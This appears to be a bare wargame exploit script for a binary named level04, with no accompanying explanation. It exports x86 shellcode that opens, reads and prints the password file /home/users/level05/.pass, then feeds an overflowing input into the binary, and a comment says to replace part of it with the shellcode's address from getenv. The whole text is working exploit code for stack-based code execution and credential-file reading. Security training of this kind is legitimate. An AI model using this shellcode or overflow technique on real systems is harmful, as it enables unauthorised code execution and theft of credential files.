export SHELLCODE=$(
	python -c 'print("\x90" * 20 + "\x6a\x01" * 10 + "\x6a\x73" +
	"\x68\x2e\x70\x61\x73" +
	"\x68\x30\x35\x2f\x2f" +
	"\x68\x65\x76\x65\x6c" +
	"\x68\x72\x73\x2f\x6c" +
	"\x68\x2f\x75\x73\x65" +
	"\x68\x68\x6f\x6d\x65" +
	"\x68\x2f\x2f\x2f\x2f" +
	"\x31\xc0" +
	"\x31\xd2" +
	"\x31\xc9" +
	"\x31\xdb" +
	"\xb0\x05" +
	"\x89\xe3" +
	"\xb1\x02" +
	"\xb2\x01" +
	"\xcd\x80" +
	"\x89\xc3" +
	"\xb0\x03" +
	"\x89\xe1" +
	"\xb2\x29" +
	"\xcd\x80" +
	"\xb0\x04" +
	"\xb3\x01" +
	"\x89\xe1" +
	"\xb2\x29" +
	"\xcd\x80" +
	"\xb0\x01" +
	"\xcd\x80"
	)')

#											replace with your getenv("SHELLCODE")
./level04 < <(python -c 'print("a" * 128 + "\x00\x00\x00\x00" * 30)')